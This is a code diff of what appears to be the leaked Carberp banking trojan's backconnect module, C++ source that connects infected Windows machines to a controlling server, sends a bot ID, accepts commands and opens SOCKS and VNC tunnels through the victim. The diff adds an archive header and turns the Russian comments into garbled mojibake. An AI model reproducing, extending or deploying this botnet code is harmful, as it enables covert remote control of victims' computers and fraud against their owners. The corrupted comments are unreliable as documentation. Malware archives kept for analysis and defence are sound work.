@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <ws2tcpip.h>
 #include <windows.h>
 #include <wininet.h>
@@ -21,20 +32,20 @@
 #if(BO_BCSERVER_PLATFORMS > 0)
 
 /*
-  Проверяет, ялвется список серверов валидным.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN list     - список.
-  IN listSize - размер списка.
+  IN list     - пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN listSize - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return      - true - список валидный,
-                false - список не валидный.
+  Return      - true - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+                false - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool isValidList(const LPSTR list, DWORD listSize)
 {
   return (Str::_isValidMultiStringA(list, listSize) && (Str::_multiStringGetCountA(list) % 3) == 0);
 }
 
-//Данные бэконекта.
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 typedef struct
 {
   LPSTR servicePort;
@@ -50,12 +61,12 @@ typedef struct
   DWORD id;
 }BCTUNNELDATA;
 
-//Список встреоных сервисов.
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 #define SERVICE_PORT_SOCKS ((DWORD)-1) //Socks.
 #define SERVICE_PORT_VNC   ((DWORD)-2) //VNC.
 
 /*
-  Поток для для создания тунеля.
+  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
   IN p   - BCTUNNELDATA.
 
@@ -71,7 +82,7 @@ static DWORD WINAPI procTunnel(void *p)
   
   WDEBUG0(WDDT_INFO, "Started.");
 
-  //Подключаемся к сервису.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   bool ok = false;
   if(bcTunnelData->servicePort == SERVICE_PORT_SOCKS)
   {
@@ -100,7 +111,7 @@ static DWORD WINAPI procTunnel(void *p)
 #   endif
   }
 
-  //Подключаемся к серверу.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   if(ok == true && (client = WSocket::tcpConnectA(bcTunnelData->bcData->server, (WORD)Str::_ToInt32A(bcTunnelData->bcData->serverPort, NULL))) != INVALID_SOCKET)
   {
     WSocket::tcpDisableDelay(client, true);
@@ -124,7 +135,7 @@ static DWORD WINAPI procTunnel(void *p)
     }      
   }
     
-  //Освобождение ресурсов.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   WSocket::tcpClose(client);
   WSocket::tcpClose(service);
   Mem::free(bcTunnelData);
@@ -134,7 +145,7 @@ static DWORD WINAPI procTunnel(void *p)
 }
 
 /*
-  Поток для для создания бэконекта.
+  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
   IN p   - BCDATA.
 
@@ -150,7 +161,7 @@ static DWORD WINAPI procConnection(void *p)
   ThreadsGroup::_createGroup(&group);
   WDEBUG0(WDDT_INFO, "Started.");
 
-  //Получаем порт сервиса
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
   DWORD servicePort = 0;
 
   if(CWA(kernel32, lstrcmpiA)(bcData->servicePort, "socks") == 0)
@@ -171,7 +182,7 @@ static DWORD WINAPI procConnection(void *p)
   
   if(servicePort != 0)
   {
-    //Подключаемся к серверу.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     SOCKET server = WSocket::tcpConnectA(bcData->server, (WORD)Str::_ToInt32A(bcData->serverPort, NULL));
     if(server != INVALID_SOCKET)
     {
@@ -179,7 +190,7 @@ static DWORD WINAPI procConnection(void *p)
       WSocket::tcpDisableDelay(server, true);
       WSocket::tcpSetKeepAlive(server, true, Backconnect::KEEPALIVE_DELAY, Backconnect::KEEPALIVE_INTERVAL);
       
-      //Отсылаем BotID.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ BotID.
       bool ok;
       {
         PESETTINGS pes;
@@ -195,7 +206,7 @@ static DWORD WINAPI procConnection(void *p)
         }
       }
       
-      //Ожидаем команд от сервера.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       if(ok)
       {
         Backconnect::COMMAND bcc;
@@ -203,7 +214,7 @@ static DWORD WINAPI procConnection(void *p)
 
         while(WSocket::tcpWaitForEvent(&server, 1, 0, NULL, 0) == server && Backconnect::_readCommand(server, &bcc, &bccData))
         {
-          //Создание тунеля.
+          //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
           if(bcc.command == Backconnect::COMMAND_CONNECT && bcc.dataSize == sizeof(DWORD))
           {
             BCTUNNELDATA *bcTunnelData = (BCTUNNELDATA *)Mem::alloc(sizeof(BCTUNNELDATA));
@@ -226,7 +237,7 @@ static DWORD WINAPI procConnection(void *p)
     }
   }
   
-  //Освобождаем ресурсы.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   ThreadsGroup::_waitForAllExit(&group, INFINITE);
   ThreadsGroup::_closeGroup(&group);
 
@@ -241,7 +252,7 @@ static DWORD WINAPI procConnection(void *p)
 }
 
 /*
-  Поток для для создания контроля бэконектов.
+  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
   Return - 0.
 */
@@ -279,7 +290,7 @@ static DWORD WINAPI proc(void *)
           LPSTR curServer      = Str::_multiStringGetIndexA(curItem, 1);
           LPSTR curServerPort  = Str::_multiStringGetIndexA(curItem, 2);
 
-          //Генерируем мютекс.
+          //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
           HANDLE bcMutex = NULL;
           {
             DWORD nameParts[3];
@@ -295,7 +306,7 @@ static DWORD WINAPI proc(void *)
             }
           }
 
-          //Создаем дочерный поток.
+          //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
           if(bcMutex != NULL)
           {
             BCDATA *bcData = (BCDATA *)Mem::alloc(sizeof(BCDATA));
@@ -351,7 +362,7 @@ bool BackconnectBot::_addStatic(LPSTR servicePort, LPSTR server, LPSTR serverPor
   WORD newItemSize;
   char newItem[256 * 3 + 3 + 1];
 
-  //Генирируем элемент.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   {
     BYTE servicePortLen = (BYTE)Str::_LengthA(servicePort);
     BYTE serverLen      = (BYTE)Str::_LengthA(server);
@@ -371,30 +382,30 @@ bool BackconnectBot::_addStatic(LPSTR servicePort, LPSTR server, LPSTR serverPor
     Str::_CopyA(offset, serverPort, serverPortLen);
     offset += serverPortLen + 1;
 
-    *offset = 0; //Завершающий байт мульти-строки.
+    *offset = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ-пїЅпїЅпїЅпїЅпїЅпїЅ.
     
     CWA(user32, CharLowerBuffA)(newItem, newItemSize);
   }
   
-  //Открываем конфигурацию.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   BinStorage::STORAGE *config = LocalConfig::beginReadWrite();
   if(config == NULL)return false;
     
-  //Получем список сущетвующих элементов.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   bool ok = true;
   DWORD itemListSize;
   LPSTR itemList = (LPSTR)BinStorage::_getItemDataEx(config, LocalConfig::ITEM_BACKCONNECT_LIST, BinStorage::ITEMF_IS_SETTING, &itemListSize);
 
-  //Если элемент существует, ищим клон.
+  //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
   if(isValidList(itemList, itemListSize))
   {
     LPSTR curItem = itemList;
     do
     {
-      //Проверяем доступно ли места больше чем, размер искомого элемента.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       if((DWORD)((itemList + itemListSize) - curItem) <= newItemSize)break;
       
-      //Сравниваем.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       if(Mem::_compare(curItem, newItem, newItemSize) == 0)
       {
         WDEBUG0(WDDT_INFO, "Item already exists.");
@@ -410,7 +421,7 @@ bool BackconnectBot::_addStatic(LPSTR servicePort, LPSTR server, LPSTR serverPor
       ok = BinStorage::_modifyItemById(&config, LocalConfig::ITEM_BACKCONNECT_LIST, BinStorage::ITEMF_IS_SETTING | BinStorage::ITEMF_COMBINE_OVERWRITE, itemList, itemListSize + newItemSize);
     }
   }
-  //Если элемент не найден, добавляем новый.
+  //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
   else
   {
     if(itemList == NULL)ok = BinStorage::_addItem(&config, LocalConfig::ITEM_BACKCONNECT_LIST, BinStorage::ITEMF_IS_SETTING | BinStorage::ITEMF_COMBINE_OVERWRITE, newItem, newItemSize + 1);
@@ -429,30 +440,30 @@ bool BackconnectBot::_addStatic(LPSTR servicePort, LPSTR server, LPSTR serverPor
 
 bool BackconnectBot::_removeStatic(LPSTR servicePort, LPSTR server, LPSTR serverPort)
 {
-  //Загружаем конфиг.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
   BinStorage::STORAGE *config = LocalConfig::beginReadWrite();
   if(config == NULL)return false;
 
-  //Получаем список элементов.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   DWORD itemListSize;
   LPSTR itemList = (LPSTR)BinStorage::_getItemDataEx(config, LocalConfig::ITEM_BACKCONNECT_LIST, BinStorage::ITEMF_IS_SETTING, &itemListSize);
   
-  //Элементов нет.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ.
   if(itemList == NULL)
   {
     Mem::free(config);
     return LocalConfig::endReadWrite(NULL);
   }
 
-  //Проверяем правильность списка.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
   bool changed = false;
   if(isValidList(itemList, itemListSize))
   {
-    //Создаем копию списка для копирования в него, элементов не попавших под маску.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
     LPSTR newItemList = (LPSTR)Mem::alloc(itemListSize);    
     if(newItemList != NULL)  
     {
-      //Ишим элементы.
+      //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       LPSTR curItem = itemList;
       LPSTR offset  = newItemList;
       int len;
@@ -481,14 +492,14 @@ bool BackconnectBot::_removeStatic(LPSTR servicePort, LPSTR server, LPSTR server
           Str::_CopyA(offset, curServerPort, len);
           offset += len + 1;
 
-          *offset = 0; //Завершающий байт мульти-строки.
+          *offset = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ-пїЅпїЅпїЅпїЅпїЅпїЅ.
         }
       }
       while((curItem = Str::_multiStringGetIndexA(curItem, 3)) != NULL);
       
       if(changed == true)
       {
-        if(offset == newItemList)offset--; //Почти аналог BinStorage::ITEMF_COMBINE_DELETE.
+        if(offset == newItemList)offset--; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ BinStorage::ITEMF_COMBINE_DELETE.
         changed = BinStorage::_modifyItemById(&config, LocalConfig::ITEM_BACKCONNECT_LIST, BinStorage::ITEMF_IS_SETTING | BinStorage::ITEMF_COMBINE_OVERWRITE, newItemList, offset - newItemList + 1);
       }
       Mem::free(newItemList);
